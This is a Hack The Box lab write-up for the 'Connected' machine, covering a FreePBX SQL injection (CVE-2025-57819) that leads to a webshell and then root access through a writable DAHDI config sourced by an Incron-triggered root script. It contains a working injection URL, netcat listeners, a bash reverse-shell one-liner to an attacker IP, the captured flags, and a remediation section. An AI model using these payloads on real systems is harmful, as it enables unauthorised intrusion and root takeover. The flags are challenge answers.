# Hack The Box — Connected Writeup

> **Active-machine material — private only. Do not publish until Connected has retired.** The literal PHP webshell signature is omitted to prevent antivirus quarantine.

## Machine information

| Field | Value |
| --- | --- |
| Machine | Connected |
| Platform | Hack The Box |
| Season | 11 |
| OS | Linux |
| Difficulty | Easy |
| Category | Web / Linux privilege escalation |
| Initial access | FreePBX CVE-2025-57819 |
| Privilege escalation | Incron and writable DAHDI configuration |

## Summary

Connected combines an unauthenticated FreePBX SQL injection with an unsafe root-owned automation chain. The web flaw provides command execution as `asterisk`; writable DAHDI configuration and an Incron trigger then cross the privilege boundary to root.

## 1. Reconnaissance

Start with a basic scan:

```bash
nmap -T5 --open connected.htb
```

```text
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

A detailed scan identifies Apache, PHP, and a redirect to `connected.htb`:

```bash
nmap -sC -sV -p 80,443 connected.htb
```

Add the hostname locally:

```bash
echo '10.129.11.176 connected.htb' | sudo tee -a /etc/hosts
```

The web application is a **FreePBX** instance.

## 2. Identifying the vulnerable application

The target runs **FreePBX 16.0.40.7**, vulnerable to **CVE-2025-57819**, an unauthenticated SQL injection in Endpoint Manager.

Test for error-based SQL injection:

```bash
curl -ik "https://connected.htb/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT USER()),'~'))--+"
```

The response discloses the database user:

```text
~USER:freepbxuser@localhost~
```

This confirms the injection point.

## 3. From SQL injection to RCE

FreePBX stores scheduled tasks in the `cron_jobs` table. Stacked SQL queries can insert a malicious job that writes a command-execution endpoint into the web root.

```text
PHP command-execution payload: [REDACTED — antivirus signature]
Base64-encoded payload:         [REDACTED — antivirus signature]
```

Conceptually, the injected query creates a task similar to:

```sql
INSERT INTO cron_jobs
  (modulename, jobname, command, class, schedule, max_runtime, enabled, execution_order)
VALUES
  ('sysadmin', 'wt-shell3', '<write redacted PHP payload to web root>',
   NULL, '* * * * *', 30, 1, 1);
```

Even when the web application returns an error, the stacked backend query may still execute. After the scheduled job runs, request the endpoint with `cmd=id`:

```bash
curl -ik 'https://connected.htb/wt-shell3.php?cmd=id'
```

```text
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

Command execution is now available as `asterisk`.

## 4. Reverse shell as `asterisk`

Start a listener:

```bash
nc -lvnp 4444
```

Use the command endpoint to launch a callback to `10.10.15.48:4444`. The exact request is omitted with the webshell payload, but the resulting shell is:

```text
connect to [10.10.15.48] from [10.129.11.176]
bash: no job control in this shell
[asterisk@connected html]$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

Read the user flag:

```bash
cat /home/asterisk/user.txt
```

```text
e18b7acfe9395729d02b441d2e151add
```

## 5. Local enumeration

Search for writable files under `/etc`:

```bash
find /etc -writable 2>/dev/null \
  | grep -v '/etc/wanpipe\|/etc/asterisk\|/etc/schmooze' \
  | head -20
```

An unusual writable configuration file appears:

```text
/etc/dahdi/init.conf
```

```bash
ls -la /etc/dahdi/init.conf
```

```text
-rw-r--r--. 1 asterisk asterisk 771 Jun 5 2023 /etc/dahdi/init.conf
```

The service account owns the file and can modify it.

## 6. Discovering Incron

Process enumeration reveals `incrond` running as root:

```bash
ps auxww | grep incron
```

```text
root 755 0.0 0.0 15044 2836 ? Ss /usr/sbin/incrond
```

Unlike cron, which reacts to time, Incron runs commands in response to filesystem events. Inspect its rules:

```bash
cat /etc/incron.d/*
```

```text
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

Closing the monitored file after a write causes root to run `/usr/sbin/sysadmin_dahdi_restart`.

```bash
ls -la /var/spool/asterisk/sysadmin/dahdi_restart
```

```text
-rw-rw-r--. 1 asterisk asterisk 0 Sep 8 2021 /var/spool/asterisk/sysadmin/dahdi_restart
```

The trigger is writable by `asterisk`.

## 7. Understanding the root script

Inspect the command invoked by Incron:

```bash
cat /usr/sbin/sysadmin_dahdi_restart
```

```bash
#!/bin/sh

/etc/init.d/asterisk stop
sleep 5
/etc/init.d/dahdi restart
sleep 5
export PATH=$PATH:/usr/local/sbin/:/usr/local/bin/
`which amportal` start
```

The important operation is the DAHDI restart. Inspect its init script:

```bash
grep -n 'init.conf\|source\|\. /etc/dahdi' /etc/init.d/dahdi
```

```text
69:[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
```

The root-run init script sources `/etc/dahdi/init.conf`. Because `asterisk` owns that file, appended shell commands execute during the privileged restart.

## 8. Privilege escalation to root

Start another listener:

```bash
nc -lvnp 4445
```

Append a callback command to the writable configuration:

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.15.48/4445 0>&1" &' >> /etc/dahdi/init.conf
```

Trigger the Incron rule by writing and closing the monitored file:

```bash
echo 'restart' > /var/spool/asterisk/sysadmin/dahdi_restart
```

After the service restart delay, the listener receives a privileged shell:

```text
connect to [10.10.15.48] from [10.129.11.176]
bash: no job control in this shell
[root@connected /]# id
uid=0(root) gid=0(root) groups=0(root)
```

## 9. Root flag

```bash
cat /root/root.txt
```

```text
b35195b1899ee2228a18da3b4a75ddee
```

## Attack chain summary

```text
FreePBX 16.0.40.7
↓
CVE-2025-57819 unauthenticated SQL injection
↓
Stacked query inserts a malicious scheduled job
↓
The job writes a PHP command endpoint
↓
RCE as asterisk
↓
Writable /etc/dahdi/init.conf
↓
Root-owned incrond monitors an asterisk-writable trigger
↓
/usr/sbin/sysadmin_dahdi_restart restarts DAHDI
↓
/etc/init.d/dahdi sources the writable init.conf
↓
Injected command executes as root
```

## Lessons learned

The initial foothold came from a modern FreePBX vulnerability, but the privilege escalation relied on a classic trust-boundary failure:

- a configuration file writable by a service account;
- a root-owned filesystem automation service;
- an Incron trigger writable by the same low-privileged user;
- an init script that sources the untrusted configuration file.

Privileged automation must treat every sourced or executed file as code. If root sources a file writable by an unprivileged account, privilege escalation becomes straightforward.

## Remediation

- Do not expose FreePBX management interfaces to untrusted networks.
- Patch FreePBX and Endpoint Manager against CVE-2025-57819.
- Avoid database-controlled scheduled commands.
- Make `/etc/dahdi/init.conf` root-owned and non-writable by service users.
- Audit every Incron rule and its trigger permissions.
- Never let root-owned services source user-writable files.
- Restrict writes under `/var/spool/asterisk/sysadmin/`.

Example permissions:

```bash
chown root:root /etc/dahdi/init.conf
chmod 644 /etc/dahdi/init.conf
chown root:root /var/spool/asterisk/sysadmin/dahdi_restart
chmod 600 /var/spool/asterisk/sysadmin/dahdi_restart
```

## Flags

```text
user.txt: e18b7acfe9395729d02b441d2e151add
root.txt: b35195b1899ee2228a18da3b4a75ddee
```
